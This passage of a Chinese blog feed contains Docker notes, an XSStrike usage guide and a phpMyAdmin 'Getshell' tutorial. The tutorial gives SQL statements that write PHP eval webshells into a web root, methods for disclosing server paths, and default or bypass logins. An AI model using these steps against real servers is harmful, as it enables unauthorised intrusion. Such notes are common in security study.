centOS 镜像来测试学习</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"># 下载 centOS 镜像<br>docker pull centos<br></code></pre></td></tr></table></figure><p>查看镜像，有啦就成功了</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404101138398.png" alt="image-20230404101138398"></p><p><strong>新建容器并启动</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">docker run [可选参数] image<br><br># 参数说明<br>--name=<span class="hljs-string">&quot;Name&quot;</span> 容器名称 tomcat01 tomcat02 用来区分容器<br>-d 后台方式运行<br>-it 使用交互方式运行，进入容器查看内容<br>-P  指定容器的端口 -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span><br>-p ip:主机端口:容器端口<br>-p 主机端口：容器端口 （常用的）<br>-p 容器端口<br>-p 随机指定端口<br><br># 测试  启动并进入容器<br>docker run -it centos /bin/bash<br>ls  # 查看容器内的 centos<br><br># 查看运行中的容器<br>docker ps<br></code></pre></td></tr></table></figure><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404101742949.png" alt="image-20230404101742949"></p><p><strong>列出所有运行的容器</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"># docker ps 命令<br># 列出当前正在运行的容器<br>-a  # 列出当前正在运行的容器 + 带出历史运行过的容器<br>-n=<span class="hljs-number">7</span> # 显示最近创建容器的个数<br>-q  # 只显示容器编号<br></code></pre></td></tr></table></figure><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404102323055.png" alt="image-20230404102323055"></p><p><strong>退出容器</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">exit # 直接容器停止并退出<br><span class="hljs-title class_">Ctrl</span> + p + q # 容器不停止退出<br></code></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">docer rm 容器<span class="hljs-variable constant_">ID</span> # 删除指定的容器，不能删除正在运行的容器<br>docer rm -f $&#123;docker ps -aq&#125; # 删除所有的容器<br>docker ps -a -q |xargs docker rm # 删除所有容器<br></code></pre></td></tr></table></figure><p><strong>启动和停止容器</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">docker start 容器 id  # 启动容器<br>docker restart 容器id# <br>docker stop 容器id<br>docker kill 容器id<br></code></pre></td></tr></table></figure><h3 id="常用其他命令">常用其他命令</h3><p><strong>后台启动容器</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 命令 docker run -d 镜像名<br><br># 问题 docker ps，发现 centos 停止了<br><br># 常见的坑，docker 容器使用后台运行，就必须要有一个前台进行，docker 发现没有应用，就会自动停止<br><br># nginx. 容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了<br></code></pre></td></tr></table></figure><p><strong>查看日志</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">docker logs -f -t --tail 容器，没有日志<br><br># 自己编写一段 shell 脚本<br>docker run -d centos /bin/sh -c <span class="hljs-string">&quot;while true;do echo yylin;sleep 1;done&quot;</span><br><br>docker ps<br><br># 显示日志<br>-tf # 显示日志<br>--tail number # 显示日志的条数<br>docker logs -tf --tail <span class="hljs-number">10</span> 容器 <span class="hljs-variable constant_">ID</span><br></code></pre></td></tr></table></figure><p><strong>查看容器中进程信息ps</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker top 容器id<br></code></pre></td></tr></table></figure><p><strong>查看镜像的元数据</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker inspect 容器id<br></code></pre></td></tr></table></figure><p><strong>进入当前正在运行的容器</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 我们通常容器使用后台方式运行的， 需要进入容器，修改一些配置<br> <br># 方法一<br>docker exec -it 容器id /bin/bash<br>ls<br>ps -ef<br><br># 方法二<br>docker attach 容器id<br> <br># docker exec       # 进入容器后开启一个新的终端，可以在里面操作<br># docker attach     # 进入容器正在执行的终端，不会启动新的进程<br></code></pre></td></tr></table></figure><p><strong>从容器内拷贝文件到主机上</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker cp 容器id: 容器内路径 主机路径<br><br></code></pre></td></tr></table></figure><h3 id="命令小结">命令小结</h3><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/xiaojie.png" alt></p><h2 id="Docker-常见环境">Docker 常见环境</h2><h3 id="Docker-安装-Nginx">Docker 安装 Nginx</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># <span class="hljs-number">1.</span> 搜索镜像 search<br>docker search nginx<br><br># <span class="hljs-number">2.</span> 下载镜像<br>docker pull nginx<br><br># <span class="hljs-number">3.</span> 启动 镜像, 运行测试<br># -d 后台运行<br># --name 给容器命名<br># -p 宿主机端口，容器内部端口<br>docker run -d --name nginx01 -p <span class="hljs-number">3344</span>:<span class="hljs-number">80</span> nginx<br></code></pre></td></tr></table></figure><h3 id="Docker安装-Tomcat">Docker安装 Tomcat</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># 官方的使用，一次性，用完即删<br>docker run -it --rm <span class="hljs-attr">tomcat</span>:<span class="hljs-number">9.0</span><br> <br># 我们之前的启动都是后台的，停止了容器之后， 容器还是可以查到，docker run -it --rm 一般用来测试，用完就删<br> <br># 下载再启动<br>docker pull tomcat<br> <br># 启动运行<br>docker run -d -p <span class="hljs-number">3344</span>:<span class="hljs-number">8080</span> --name tomcat01 tomcat<br> <br># 测试访问没有问题<br>curl <span class="hljs-attr">localhost</span>:<span class="hljs-number">3355</span> <br><br># 进入容器<br>docker exec -it tomcat01 /bin/bash<br> <br># 发现问题：<br><span class="hljs-number">1.</span> linux 命令少了<br><span class="hljs-number">2.</span> 没有 webapps<br><span class="hljs-number">3.</span> 阿里云镜像原因，默认是最小的镜像，所有的不必要的被剔除<br></code></pre></td></tr></table></figure><h3 id="部署-es-kibna">部署 es + kibna</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># es 暴露的端口很多<br># es 十分的耗内存<br># es 的数据一般需要放置到安全目录！ 挂载<br># --net somenetwork 网络配置<br># 启动elasticsearch<br>docker run -d --name elasticsearch --net somenetwork -p <span class="hljs-number">9200</span>:<span class="hljs-number">9200</span> -p <span class="hljs-number">9300</span>:<span class="hljs-number">9300</span> -e <span class="hljs-string">&quot;discovery.type=single-node&quot;</span> <span class="hljs-attr">elasticsearch</span>:<span class="hljs-number">7.6</span><span class="hljs-number">.2</span><br>测试<br>curl <span class="hljs-attr">localhost</span>:<span class="hljs-number">9200</span><br># 增加内存限制，修改配置文件 -e 环境配置修改<br>docker run -d --name elasticsearch -p <span class="hljs-number">9200</span>:<span class="hljs-number">9200</span> -p <span class="hljs-number">9300</span>:<span class="hljs-number">9300</span> -e <span class="hljs-string">&quot;discovery.type=single-node&quot;</span> -e <span class="hljs-variable constant_">ES_JAVA_OPTS</span>=<span class="hljs-string">&quot;-Xms64m -Xmx512m&quot;</span> <span class="hljs-attr">elasticsearch</span>:<span class="hljs-number">7.6</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure><h2 id="可视化软件">可视化软件</h2><p>portainer</p><ul><li>Docker 的一个图形化界面管理工具，提供一个后台面板</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer<br> <br># 测试<br>curl localhost:8088<br><br># 外网访问 http://ip:9000<br></code></pre></td></tr></table></figure><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404150821917.png" alt="image-20230404150821917"></p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404150843080.png" alt="image-20230404150843080"></p><h2 id="Docker-镜像讲解">Docker 镜像讲解</h2><h3 id="镜像是什么">镜像是什么</h3><p>镜像是一种轻量级，可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件</p><p>所有的应用，直接打包 docker 镜像，就可以直接跑起来</p><p>如何得到镜像：</p><ul><li>从远程仓库下载</li><li>朋友拷贝给你</li><li>自己制作一个镜像 DockerFile</li></ul><h3 id="Docker-镜像加载原理">Docker 镜像加载原理</h3><blockquote><p>UnionFS (联合文件系统)</p></blockquote><p>Docker 的镜像实际由一层一层的文件系统组成，这种层级的文件系统 UnionFS</p><p>虚拟机分钟级启动</p><p>容器是秒级启动</p><h2 id="提交镜像">提交镜像</h2><h3 id="commit-镜像">commit 镜像</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">docker commit 提交容器成为一个新的副本<br><br># 同 git<br>docker commit -m=<span class="hljs-string">&#x27;描述提交的信息&#x27;</span> -a=<span class="hljs-string">&quot;作者&quot;</span> 容器 id 目标镜像名：[<span class="hljs-variable constant_">TAG</span>]<br></code></pre></td></tr></table></figure><h2 id="容器数据卷">容器数据卷</h2><h3 id="容器数据卷的概念">容器数据卷的概念</h3><p>docker 的理念：</p><ul><li>将应用于环境打包成一个镜像</li><li>数据？如果数据都在容器中，那么我们容器删除，数据就会丢失！需求：数据持久化</li><li>MySQL，容易删除，删库跑路！ 需求：MySQL 数据可以存储在本地！</li></ul><p>容器之间有一个可以数据共享的技术！ Docker 容器中产生的数据，同步到本地！</p><p>这就是卷技术！ 目录的挂载，将容器中的目录，挂载在 Linux 上面！</p><p>总结：容器的持久化和他同步操作！容器间也是可以数据共享的</p><h3 id="使用数据卷">使用数据卷</h3><p>直接使用命令来挂载 -v</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker run -it -v 主机目录: 容器内目录 <br><br># 测试<br>docker run -it -v /home/ceshi:/home centos /bin/bash<br></code></pre></td></tr></table></figure><p>容器之间的同步是双向的，我们以后只需要在本地修改即可，容器自动同步</p><h3 id="MySQL-挂载实战">MySQL 挂载实战</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># 获取镜像<br>docker pull <span class="hljs-attr">mysql</span>:<span class="hljs-number">5.7</span><br>docker run --name some-mysql -e <span class="hljs-variable constant_">MYSQL_ROOT_PASSWORD</span>=my-secret-pw -d <span class="hljs-attr">mysql</span>:tag<br>-d      # 后台运行<br>-p      # 端口隐射<br>-v      # 卷挂载<br>-e      # 环境配置<br>--name  # 容器的名字<br>例<br>docker run -d -p <span class="hljs-number">3344</span>:<span class="hljs-number">3306</span> -v /home/mysql/<span class="hljs-attr">conf</span>:<span class="hljs-regexp">/etc/my</span>sql/conf.<span class="hljs-property">d</span> -v /home/mysql/<span class="hljs-attr">data</span>:<span class="hljs-regexp">/var/</span>lib/mysql -e <span class="hljs-variable constant_">MYSQL_ROOT_PASSWORD</span>=<span class="hljs-number">123456</span> --name mysql01 <span class="hljs-attr">mysql</span>:<span class="hljs-number">5.7</span><br></code></pre></td></tr></table></figure><h2 id="匿名和具名挂载">匿名和具名挂载</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># 匿名挂载<br>docker run -d -P --name nginx01 -v /etc/nginx nginx<br># -P 随机指定端口<br><br># 查看所有的 volumn 的情况<br>docker volume ls <br><br># 这里发现，这种就是匿名的，我们在 -v 只写了容器内的路径，没有容器外的路径<br><br># 具名挂载<br>docker run -d -P --name nginx02 -v juming-<span class="hljs-attr">nginx</span>:<span class="hljs-regexp">/etc/</span>nginx nginx<br><br>docker volume ls<br><span class="hljs-variable constant_">DRIVER</span><span class="hljs-variable constant_">VOLUME</span><span class="hljs-variable constant_">NAME</span><br>localjuming-nginx<br><br># 通过 -v 卷名:容器内路径<br># 查看一下这个卷<br>docker volume insepect juming-nginx<br></code></pre></td></tr></table></figure><p>所有容器的卷，没有指定目录的情况下都是在： /var/lib/docker/volumes/xxx/<em>data</em></p><p>我们通过具名挂载可以方便的找到我们的一个卷，大多数情况下使用的是具名挂载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-v  容器内路径                   # 匿名挂载<br>-v  卷名:容器内路径               # 具名挂载<br>-v /主机路径:容器内路径            # 指定路径挂载<br></code></pre></td></tr></table></figure><p>扩展：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"># 通过 -v 容器内路径： ro rw 改变读写权限<br>ro readonly # 只读<br>rw readwrite # 可读可写<br><br># 一旦这个设置了容器权限，容器对我们挂载出来的就有限定了！<br>docker run -d -P --name nginx02 -v juming-<span class="hljs-attr">nginx</span>:<span class="hljs-regexp">/etc/</span><span class="hljs-attr">nginx</span>:ro nginx<br>docker run -d -O --name nginx02 -v juming-<span class="hljs-attr">nginx</span>:<span class="hljs-regexp">/etc/</span><span class="hljs-attr">nginx</span>:rw nginx<br><br># ro 只要看到 ro接说明这个路径只能通过宿主机来操作，容器内部是无法操作的！<br></code></pre></td></tr></table></figure><h2 id="DockerFile">DockerFile</h2><blockquote><p>DockerFile就是用来构建docker镜像的构建文件</p></blockquote><h3 id="创建一个-Dockerfile">创建一个 Dockerfile</h3><p>构建步骤</p><ol><li>编写一个dockerFile文件</li><li>docker build 构建成为一个镜像</li><li>docker run 运行镜像</li><li>docker push 发布镜像（DockerHub、阿里云镜像）</li></ol><h3 id="创建第一个-Dockerfile">创建第一个 Dockerfile</h3><p><strong>基础知识：</strong></p><ol><li>每个保留关键字（指令）都是必须大写字母</li><li>执行从上到下顺序执行</li><li><code>#</code> 表示注释</li><li>每个指令都会创建提交一个新的镜像层，并提交！</li></ol><h3 id="DockerFile-的指令">DockerFile 的指令</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span><span class="hljs-comment"># 基础镜像，一切从这里开始</span><br><span class="hljs-keyword">MAINTAINER</span>  <span class="hljs-comment"># 镜像是谁写的，姓名 + 邮箱</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-comment"># 镜像构建的时候需要运行的命令</span></span><br><span class="hljs-keyword">ADD</span><span class="language-bash"><span class="hljs-comment"># 步骤，tomcat镜像，这个 tomcat压缩包，添加内容</span></span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"><span class="hljs-comment"># 镜像的工作目录  /bin/bash</span></span><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"><span class="hljs-comment"># 挂载的目录</span></span><br><span class="hljs-keyword">EXPOSE</span><span class="hljs-comment"># 暴露端口配置</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"><span class="hljs-comment"># 指定这个容器启动的时候要运行的命令  cmd echo，只有最后一个会生效，可被替代</span></span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"><span class="hljs-comment">#  指定这个容器启动的时候要运行的命令，可以追加命令</span></span><br><span class="hljs-keyword">ONBUILD</span><span class="hljs-comment"># 当构建一个被继承 DockerFile 这个时候会运行 ONBUILD 的指令，触发指令</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"><span class="hljs-comment"># 类似 ADD，将我们的文件拷贝到镜像中</span></span><br><span class="hljs-keyword">ENV</span><span class="hljs-comment"># 构建的时候设置环境变量！ es 设置内存大小</span><br></code></pre></td></tr></table></figure><p>实战</p><p><strong>dockerfile创建一个简单apache服务器</strong></p><h2 id="Docker-网络">Docker 网络</h2><h3 id="docker0">docker0</h3><p>初始化 docker 环境</p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">docker rmi -f $(docker images -aq)<br></code></pre></td></tr></table></figure><p>Linux 下获取 ip地址</p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">ip addr<br></code></pre></td></tr></table></figure><p>查看所有 docker 网络</p><p>docker network ls</p><p>网络模式：</p><p>桥接 docker （默认）</p><p>none：不配置网络</p><p>host：和宿主机共享网络</p>]]></content>
      
      
      <categories>
          
          <category> 项目部署 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin Getshell</title>
      <link href="/2023/03/28/phpmyadmin%20Getshell%20%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/03/28/phpmyadmin%20Getshell%20%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1>phpmyadmin Getshell 思路</h1><h2 id="前提：php爆破绝对路径">前提：php爆破绝对路径</h2><h3 id="单引号爆路径">单引号爆路径</h3><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</p><p><code>www.xxx/news.php?id=1′</code></p><h3 id="错误参数值爆路径">错误参数值爆路径</h3><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p><h3 id="google爆路径">google爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名。</p><p><code>Site:xxx.edu.tw warning</code><br><code>Site:xxx.com.tw “fatal error”</code></p><h3 id="测试文件爆路径">测试文件爆路径</h3><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">www.xxx.com/test.php<br>www.xxx.com/ceshi.php<br>www.xxx.com/info.php<br>www.xxx.com/phpinfo.php<br>www.xxx.com/php_info.php<br>www.xxx.com/1.php<br></code></pre></td></tr></table></figure><h3 id="phpmyadmin爆路径">phpmyadmin爆路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/phpmyadmin/libraries/lect_lang.lib.php<br>/phpMyAdmin/index.php?lang[]=1<br>/phpMyAdmin/phpinfo.php<br>load_file()<br>/phpmyadmin/themes/darkblue_orange/layout.inc.php<br>/phpmyadmin/libraries/select_lang.lib.php<br>/phpmyadmin/libraries/lect_lang.lib.php<br>/phpmyadmin/libraries/mcrypt.lib.php<br></code></pre></td></tr></table></figure><h3 id="配置文件找路径">配置文件找路径</h3><p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Windows:<br>c:\windows\php.ini php配置文件<br>c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件<br>Linux:<br>/etc/php.ini php配置文件<br>/etc/httpd/conf.d/php.conf<br>/etc/httpd/conf/httpd.conf Apache配置文件<br>/usr/local/apache/conf/httpd.conf<br>/usr/local/apache2/conf/httpd.conf<br>/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件<br></code></pre></td></tr></table></figure><h3 id="nginx文件类型错误解析爆路径">nginx文件类型错误解析爆路径</h3><p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p><h2 id="信息收集">信息收集</h2><h3 id="通过SQL查询信息">通过SQL查询信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select version(); -- 查看数据库版本<br>select @@datadir;  select @@basedir; -- 查看数据库存储路径<br>show VARIABLES like &#x27;%char%&#x27;; -- 查看系统变量<br></code></pre></td></tr></table></figure><h2 id="Getshell">Getshell</h2><h3 id="前提条件">前提条件</h3><p>网站真实路径。如果不知道网站真实路径则后续无法通过URL的方式连shell</p><p>读写权限。查询secure_file_priv参数(<strong>select @@secure_file_priv</strong> )，查看是否具有读写权限,若为NULL则无法写入shell。这个值是只读变量，只能通过配置文件修改，且更改后需<strong>重启服务</strong>才生效。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- secure_file_priv=NULL,禁止导入导出<br><br>-- secure_file_priv=&#x27;&#x27;,不限制导入导出<br><br>-- secure_file_priv=/path/,只能向指定目录导入导出<br><br>select load_file(&#x27;c:/phpinfo.php&#x27;); -- 读取文件<br><br>select &#x27;123&#x27; into outfile &#x27;c:/shell.php&#x27;; -- 写入文件<br></code></pre></td></tr></table></figure><h3 id="常规Getshell">常规Getshell</h3><h4 id="直接通过SQL查询写入shell">直接通过SQL查询写入shell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">设绝对路径为C:\phpStudy\WWW<br><br>select &#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;;<br></code></pre></td></tr></table></figure><h4 id="通过日志文件写shell">通过日志文件写shell</h4><blockquote><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p></blockquote><p>检测全局变量(general_log, general_log file)</p><p>1.general log 指的是日志保存状态，一共有两个值（ON/OFF）</p><p>2.general log file 指的是日志的保存路径。</p><p>开启与关闭：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set global general_log = &quot;ON&quot;; -- 打开日志保存<br><br>set global general_log_file = &quot;G:/phpstudy/WWW/log.php&quot;; -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接。<br></code></pre></td></tr></table></figure><p>上传shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select &#x27;&lt;?php eval($_POST[pwd]); ?&gt;&#x27;;<br></code></pre></td></tr></table></figure><h4 id="创建新表getshell">创建新表getshell</h4><p>进入一个数据库，新建数据表。</p><p>名字随意</p><p>字段数填1</p><p>添加字段</p><p>字段名任意</p><p>字段类型为TEXT</p><p>插入一句话木马：</p><?php eval($_POST[pwd]); ?><p>SQL查询验证木马是否上传成功</p><p>设绝对路径为： G:\phpStudy\WWW</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from shell_table into outfile &quot;G:/phpstudy/WWW/shell.php&quot;;<br></code></pre></td></tr></table></figure><p>以上步骤也可通过SQL语句执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Create TABLE shell_table (xiaoma text NOT NULL) -- 建表<br><br>Insert INTO shell_table (xiaoma) VALUES(&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); -- 写入<br><br>select * from shell_table into outfile &#x27;G:/phpstudy/WWW/shell.php&#x27;; -- 导出<br><br>Drop TABLE IF EXISTS shell_table; -- 删表<br></code></pre></td></tr></table></figure><h2 id="CVE">CVE</h2><p><strong>CVE-2013-3238</strong></p><blockquote><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 <a href="http://ANYUN.ORG">ANYUN.ORG</a></p><p>利用模块：exploit/multi/http/phpmyadminpregreplace</p></blockquote><p><strong>CVE-2012-5159</strong></p><blockquote><p>影响版本：phpMyAdmin v3.5.2.2</p><p>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p></blockquote><p><strong>CVE-2009-1151</strong></p><blockquote><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><p>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p><p>利用模块：exploit/unix/webapp/phpmyadmin_config</p></blockquote><h2 id="弱口令-万能密码">弱口令&amp;万能密码</h2><p>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p><p>万能密码：版本2.11.3 / 2.11.4，用户名：‘localhost’@’@” 密码任意</p><p>root/root</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSStrike工具</title>
      <link href="/2023/03/17/XSStrike%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/03/17/XSStrike%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1>XSStrike</h1><blockquote><p>XSStrike 是一款用于探测并利用XSS漏洞的脚本</p><p>XSStrike目前所提供的产品特性：</p><blockquote><p>对参数进行模糊测试之后构建合适的payload</p><p>使用payload对参数进行穷举匹配</p><p>内置爬虫功能</p><p>检测并尝试绕过WAF</p><p>同时支持GET及POST方式</p><p>大多数payload都是由作者精心构造</p><p>误报率极低</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">下载地址：https://github.com/s0md3v/XSStrike<br></code></pre></td></tr></table></figure><p>安装依赖模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">pip install -r requirements.txt<br></code></pre></td></tr></table></figure><h2 id="使用">使用</h2><h3 id="1-测试一个使用GET方法的网页：">1.测试一个使用GET方法的网页：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;&quot;<br></code></pre></td></tr></table></figure><h3 id="2-测试POST数据：">2.测试POST数据：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/search.php&quot; --data &quot;q=query&quot;<br>python xsstrike.py -u &quot;http://example.com/search.php&quot; --data &#x27;&#123;&quot;q&quot;:&quot;query&quot;&#125; --json&#x27;<br></code></pre></td></tr></table></figure><h3 id="3-测试URL路径：">3.测试URL路径：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/search/form/query&quot; --path<br></code></pre></td></tr></table></figure><h3 id="4-从目标网页开始搜寻目标并进行测试">4.从目标网页开始搜寻目标并进行测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/page.php&quot; --crawl<br></code></pre></td></tr></table></figure><h4 id="可以指定爬网的深度-默认2：-l">可以指定爬网的深度,默认2：-l</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/page.php&quot; --crawl -l 3<br></code></pre></td></tr></table></figure><h3 id="5-如果要测试文件中的URL，或者只是想添加种子进行爬网，则可以使用该–seeds选项：">5.如果要测试文件中的URL，或者只是想添加种子进行爬网，则可以使用该–seeds选项：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py --seeds urls.txt<br></code></pre></td></tr></table></figure><h3 id="6-查找隐藏的参数：">6.查找隐藏的参数：</h3><p>通过解析HTML和暴力破解来查找隐藏的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/page.php&quot; --params<br></code></pre></td></tr></table></figure><h3 id="7-盲XSS：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码">7.盲XSS：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u http://example.com/page.php?q=query --c --rawl --blind<br></code></pre></td></tr></table></figure><h3 id="8-模糊测试–fuzzer">8.模糊测试–fuzzer</h3><p>该模糊器旨在测试过滤器和Web应用程序防火墙，可使用-d选项将延迟设置为1秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot; --fuz<br></code></pre></td></tr></table></figure><h3 id="9-跳过DOM扫描">9.跳过DOM扫描</h3><p>在爬网时可跳过DOM XSS扫描，以节省时间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot; --skip-dom<br></code></pre></td></tr></table></figure><p>10.更新：</p><p>如果跟上–updata选项，XSStrike将检查更新。如果有更新的版本可用，XSStrike将下载更新并将其合并到当前目录中，而不会覆盖其他文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python xsstrike.py --update<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>edusrc_信息泄露_湖南某大学</title>
      <link href="/2023/03/09/%E6%B9%96%E5%8D%97%E6%9F%90%E5%A4%A7%E5%AD%A6/"/>
      <url>/2023/03/09/%E6%B9%96%E5%8D%97%E6%9F%90%E5%A4%A7%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" 